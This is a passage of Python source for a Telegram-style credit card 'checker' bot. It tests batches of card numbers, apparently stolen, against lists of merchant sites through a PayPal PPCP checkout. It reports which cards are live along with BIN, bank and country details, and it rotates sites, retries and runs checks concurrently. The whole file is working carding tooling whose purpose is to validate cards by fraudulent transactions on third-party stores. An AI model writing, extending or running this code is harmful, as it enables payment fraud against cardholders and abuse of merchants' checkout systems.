            'DUPLICATE_INVOICE_ID': ('DEAD', 'DUPLICATE_INVOICE_ID'),
            'session has expired': ('DEAD', 'Session expired'),
            'Payment provider declined': ('DEAD', 'Payment provider declined')
        }

        for pattern, (status, message) in error_patterns.items():
            if pattern in payment_result:
                result['status'] = status
                result['message'] = message
                
                elapsed_time = time.time() - self.start_time

                if status == 'CCN':
                    response_text = f"""CCN ✅

𝗖𝗖 ⇾ {self.cc_data}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Ppcp-gateway
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {message}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'Unknown')} - {bin_info.get('type', 'Unknown')} - {bin_info.get('level', 'Unknown')}
𝗕𝗮𝗻𝗸: {bin_info.get('issuer', 'Unknown')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'Unknown')} 🏳️

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""

                    result['response_text'] = response_text
                    result['formatted_status'] = 'CCN'
                else:
                    response_text = f"""DECLINED ❌

𝗖𝗖 ⇾ {self.cc_data}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Ppcp-gateway
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {message}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'Unknown')} - {bin_info.get('type', 'Unknown')} - {bin_info.get('level', 'Unknown')}
𝗕𝗮𝗻𝗸: {bin_info.get('issuer', 'Unknown')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'Unknown')} 🏳️

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""

                    result['response_text'] = response_text

                return result

        # Try to extract generic message
        try:
            data = json.loads(payment_result)
            if 'messages' in data:
                msg = re.sub(r'<[^>]+>', '', data['messages'])
                msg = re.sub(r'\s+', ' ', msg).strip()
                result['message'] = msg[:100]
        except:
            pass

        elapsed_time = time.time() - self.start_time

        response_text = f"""DECLINED ❌

𝗖𝗖 ⇾ {self.cc_data}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Ppcp-gateway
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {result['message']}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'Unknown')} - {bin_info.get('type', 'Unknown')} - {bin_info.get('level', 'Unknown')}
𝗕𝗮𝗻𝗸: {bin_info.get('issuer', 'Unknown')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'Unknown')} 🏳️

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""

        result['response_text'] = response_text
        return result

    def _error_result(self, message: str, check_bad_site: bool = False) -> Dict[str, Any]:
        """Create error result with bad site detection"""
        elapsed_time = time.time() - self.start_time
        
        response_text = f"""ERROR ❌

𝗖𝗖 ⇾ {self.cc_data}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Ppcp-gateway
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {message}
𝗦𝗶𝘁𝗲 ⇾ {self.hostname}

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""

        return {
            'cc': self.cc_data,
            'site': self.hostname,
            'status': 'ERROR',
            'message': message,
            'bin_info': {'brand': 'Unknown', 'type': 'Unknown', 'level': 'Unknown', 'issuer': 'Unknown', 'country': 'Unknown'},
            'response_text': response_text,
            'bad_site_detected': check_bad_site
        }


async def create_session() -> aiohttp.ClientSession:
    """Create a shared session with optimized connection pooling for bare metal server"""
    connector = aiohttp.TCPConnector(
        limit=Config.CONNECTION_LIMIT,
        limit_per_host=Config.CONNECTION_LIMIT_PER_HOST,
        ttl_dns_cache=600,
        use_dns_cache=True,
        ssl=False,
        keepalive_timeout=60,  # Longer keepalive for connection reuse
        enable_cleanup_closed=True,
        force_close=False,
        # Additional optimizations for high concurrency
        resolver=None,  # Use default resolver
    )
    
    timeout = aiohttp.ClientTimeout(
        total=Config.TIMEOUT,
        connect=10,  # Slightly longer connect timeout for reliability
        sock_read=15,  # Longer read timeout
        sock_connect=10
    )
    
    return aiohttp.ClientSession(
        connector=connector, 
        timeout=timeout,
        trust_env=True,
        # Enable automatic decompression
        auto_decompress=True,
    )


def _is_empty_response(result: Dict[str, Any]) -> bool:
    """Check if the result has an empty or missing response message"""
    if not result:
        return True
    
    message = result.get('message', '')
    response_text = result.get('response_text', '')
    
    # Check for empty message
    if not message or message.strip() == '' or message == 'Unknown error':
        return True
    
    # Check if response text has empty Response field
    if '𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ \n' in response_text or '𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾  \n' in response_text:
        return True
    
    # Check for "No payment response" which indicates site issue
    if message == 'No payment response':
        return True
    
    return False


def _is_bad_site_response(result: Dict[str, Any]) -> bool:
    """Check if the result indicates a bad site that should trigger retry with different site"""
    if not result:
        return False
    
    message = result.get('message', '').lower()
    
    # Check for bad site detection flag
    if result.get('bad_site_detected', False):
        return True
    
    # Check for specific bad site patterns in message
    bad_patterns = [
        'out of stock',
        'cannot find product id',
        'product not found',
        'bad site detected',
        'failed to load product page',
        'failed to load checkout',
        'cart is empty',
    ]
    
    for pattern in bad_patterns:
        if pattern in message:
            return True
    
    return False


async def check_single_card(card_details: str, site_urls: List[str], proxy: Optional[str] = None) -> str:
    """Check a single card asynchronously with bad site handling and empty response retry"""
    global _session
    
    # Track gateway usage start
    check_start_time = time.time()
    if GATEWAY_STATS_AVAILABLE:
        track_request_start('pp')
    
    try:
        if _session is None:
            _session = await create_session()
        
        # Get available sites (excluding bad ones)
        available_sites = get_available_sites() if not site_urls else site_urls
        
        if not available_sites:
            # Fallback to original sites if all are marked bad
            available_sites = site_urls if site_urls else load_sites()
        
        if not available_sites:
            # Track failed request
            check_elapsed = time.time() - check_start_time
            if GATEWAY_STATS_AVAILABLE:
                track_request_end('pp', success=False, response_time=check_elapsed)
            return "❌ No sites available! All sites may be marked as bad."
        
        # Make a copy of available sites to track which ones we've tried
        sites_to_try = available_sites.copy()
        random.shuffle(sites_to_try)
        
        max_site_retries = min(5, len(sites_to_try))  # Try up to 5 different sites for bad site issues
        empty_response_retries = 3  # Retry 3 times on same site for empty responses before marking as bad
        tried_sites = []
        last_result = None
        
        for site_attempt in range(max_site_retries):
            if not sites_to_try:
                break
                
            site_url = sites_to_try.pop(0)
            tried_sites.append(site_url)
            
            logger.info(f"Checking card on site: {site_url} (site attempt {site_attempt + 1}/{max_site_retries})")
            
            # Retry loop for empty responses on the same site
            empty_retry_count = 0
            site_has_empty_response = False
            
            for empty_retry in range(empty_response_retries):
                checker = AsyncCardChecker(card_details, site_url, proxy, _session)
                result = await checker.check()
                last_result = result
                
                # Check if response indicates a bad site (out of stock, cannot find product ID, etc.)
                # If bad site detected, the site is already moved to badsites.txt by the checker
                # Don't send response, just retry with a different site
                if _is_bad_site_response(result):
                    logger.warning(f"Bad site detected: {site_url} - {result.get('message', 'Unknown')}. Retrying with different site...")
                    break  # Exit empty retry loop, try next site
                
                # Check if response is empty or has no meaningful message
                if _is_empty_response(result):
                    empty_retry_count += 1
                    logger.warning(f"Empty response from site {site_url}, retry {empty_retry_count}/{empty_response_retries}")
                    
                    if empty_retry_count < empty_response_retries:
                        # Wait a bit before retrying on same site
                        await asyncio.sleep(0.5)
                        continue  # Retry on same site
                    else:
                        # After 3 retries with empty response, mark site as bad
                        site_has_empty_response = True
                        logger.warning(f"Site {site_url} returned empty response {empty_response_retries} times, marking as bad")
                        add_bad_site(site_url, f"Empty response after {empty_response_retries} retries - no payment result")
                        logger.info(f"Marked site as bad due to repeated empty responses: {site_url}")
                        break  # Exit empty retry loop, try next site
                else:
                    # Got a valid response (not empty, not bad site), return it
                    response_text = result.get('response_text', f"ERROR: {result.get('message', 'Unknown error')}")
                    # Track successful request
                    check_elapsed = time.time() - check_start_time
                    is_approved = ("CCN" in response_text and "✅" in response_text) or ("CVV" in response_text and "✅" in response_text)
                    if GATEWAY_STATS_AVAILABLE:
                        track_request_end('pp', success=is_approved or "❌" not in response_text[:20], response_time=check_elapsed)
                    return response_text
            
            # If we got here due to bad site or empty response after retries, continue to next site
            if _is_bad_site_response(result) or site_has_empty_response:
                continue  # Try next site
        
        # All retries exhausted - all sites were bad or returned empty responses
        # Return a meaningful error message with BIN info
        start_time = time.time()
        bin_info = await BinChecker.check(card_details.split('|')[0][:6], UserAgentGenerator.get())
        elapsed_time = time.time() - start_time + (last_result.get('elapsed_time', 0) if last_result else 0)
        
        error_response = f"""ERROR ❌

𝗖𝗖 ⇾ {card_details}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Ppcp-gateway
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ All sites unavailable (out of stock/product issues) - tried {len(tried_sites)} sites

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'Unknown')} - {bin_info.get('type', 'Unknown')} - {bin_info.get('level', 'Unknown')}
𝗕𝗮𝗻𝗸: {bin_info.get('issuer', 'Unknown')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'Unknown')} 🏳️

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""
        
        # Track failed request (all sites unavailable)
        check_elapsed = time.time() - check_start_time
        if GATEWAY_STATS_AVAILABLE:
            track_request_end('pp', success=False, response_time=check_elapsed)
        
        return error_response
    
    except Exception as e:
        # Track failed request on exception
        check_elapsed = time.time() - check_start_time
        if GATEWAY_STATS_AVAILABLE:
            track_request_end('pp', success=False, response_time=check_elapsed)
        raise
        raise


async def check_multiple_cards(card_list: List[str], site_list: List[str], max_concurrent: int = 10) -> List[str]:
    """Check multiple cards with controlled concurrency (returns all results at once)"""
    semaphore = asyncio.Semaphore(max_concurrent)
    
    async def check_with_semaphore(card):
        async with semaphore:
            return await check_single_card(card, site_list)
    
    tasks = [check_with_semaphore(card) for card in card_list]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    # Handle exceptions
    formatted_results = []
    for i, result in enumerate(results):
        if isinstance(result, BaseException):
            formatted_results.append(f"ERROR: Exception checking card {card_list[i]}: {str(result)}")
        else:
            formatted_results.append(result)
    
    return formatted_results


async def check_cards_streaming(
    card_list: List[str], 
    site_list: List[str], 
    max_concurrent: int = 10,
    callback: Optional[Callable[[int, str, str], Any]] = None
) -> AsyncGenerator[Tuple[int, str, str], None]:
    """
    Check multiple cards with streaming results - yields each result immediately.
    
    Args:
        card_list: List of cards to check
        site_list: List of site URLs
        max_concurrent: Maximum concurrent checks
        callback: Optional callback function(index, card, result) called for each result
        
    Yields:
        Tuple of (index, card, result) for each card as it completes
    """
    global _session
    if _session is None:
        _session = await create_session()
    
    # Get available sites
    available_sites = get_available_sites() if not site_list else site_list
    if not available_sites:
        available_sites = site_list if site_list else load_sites()
    
    if not available_sites:
        for i, card in enumerate(card_list):
            result = "❌ No sites available! All sites may be marked as bad."
            if callback:
                if asyncio.iscoroutinefunction(callback):
                    await callback(i, card, result)
                else:
                    callback(i, card, result)
            yield (i, card, result)
        return
    
    semaphore = asyncio.Semaphore(max_concurrent)
    results_queue = asyncio.Queue()
    
    async def check_card_task(index: int, card: str):
        """Check a single card and put result in queue"""
        async with semaphore:
            try:
                result = await check_single_card(card, available_sites)
            except Exception as e:
                result = f"ERROR: Exception checking card: {str(e)}"
            
            await results_queue.put((index, card, result))
    
    # Start all tasks
    tasks = [asyncio.create_task(check_card_task(i, card)) for i, card in enumerate(card_list)]
    
    # Yield results as they complete
    completed = 0
    total = len(card_list)
    
    while completed < total:
        index, card, result = await results_queue.get()
        completed += 1
        
        # Call callback if provided
        if callback:
            if asyncio.iscoroutinefunction(callback):
                await callback(index, card, result)
            else:
                callback(index, card, result)
        
        yield (index, card, result)
    
    # Wait for all tasks to complete (cleanup)
    await asyncio.gather(*tasks, return_exceptions=True)


async def check_cards_with_immediate_callback(
    card_list: List[str],
    site_list: List[str],
    on_result: Callable[[int, str, str], Any],
    max_concurrent: int = 10
) -> dict:
    """
    Check multiple cards and call callback immediately for each result.
    
    Args:
        card_list: List of cards to check
        site_list: List of site URLs
        on_result: Callback function(index, card, result) called immediately for each result
        max_concurrent: Maximum concurrent checks
        
    Returns:
        Summary dict with counts
    """
    approved_count = 0
    declined_count = 0
    error_count = 0
    
    async for index, card, result in check_cards_streaming(card_list, site_list, max_concurrent):
        # Call the callback immediately
        if asyncio.iscoroutinefunction(on_result):
            await on_result(index, card, result)
        else:
            on_result(index, card, result)
        
        # Count results
        if "CCN" in result and "✅" in result:
            approved_count += 1
        elif "CVV" in result and "✅" in result:
            approved_count += 1
        elif "ERROR" in result:
            error_count += 1
        else:
            declined_count += 1
    
    return {
        'total': len(card_list),
        'approved': approved_count,
        'declined': declined_count,
        'errors': error_count
    }


async def cleanup():
    """Cleanup resources"""
    global _session
    if _session:
        await _session.close()
        _session = None


# Main entry point for async usage
async def main_async():
    """Async main function for production use"""
    try:
        # Load sites and cards
        sites = []
        cards = []
        
        # Try to load sites.txt from ppcp directory first
        sites_file = 'ppcp/sites.txt'
        if not os.path.exists(sites_file):
            sites_file = 'sites.txt'
            
        if os.path.exists(sites_file):
            with open(sites_file, 'r') as f:
                sites = [line.strip() for line in f if line.strip()]
            random.shuffle(sites)
        
        # Try to load cc.txt from current directory
        if os.path.exists('cc.txt'):
            with open('cc.txt', 'r') as f:
                cards = [line.strip() for line in f if line.strip()]
        
        if not sites:
            logger.error("No sites found in sites.txt")
            return
        
        if not cards:
            logger.error("No cards found in cc.txt")
            return
        
        logger.info(f"Loaded {len(sites)} sites and {len(cards)} cards")
        logger.info(f"Starting check with max {Config.MAX_CONCURRENT_REQUESTS} concurrent requests")
        
        # Check cards
        results = await check_multiple_cards(cards, sites, Config.MAX_CONCURRENT_REQUESTS)
        
        # Print results
        for result in results:
            print(result)
            
    except Exception as e:
        logger.error(f"Error in main async: {e}")
    finally:
        await cleanup()


# Sync wrapper for backward compatibility
def check_ppcp_card(card_details: str, site_urls: List[str]) -> str:
    """Sync wrapper for single card checking"""
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            try:
                import nest_asyncio
                nest_asyncio.apply()
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
            except ImportError:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
        return loop.run_until_complete(check_single_card(card_details, site_urls))
    except Exception as e:
        logger.error(f"Error in sync wrapper: {e}")
        return f"ERROR: {str(e)}"


if __name__ == "__main__":
    # Run async main
    asyncio.run(main_async())
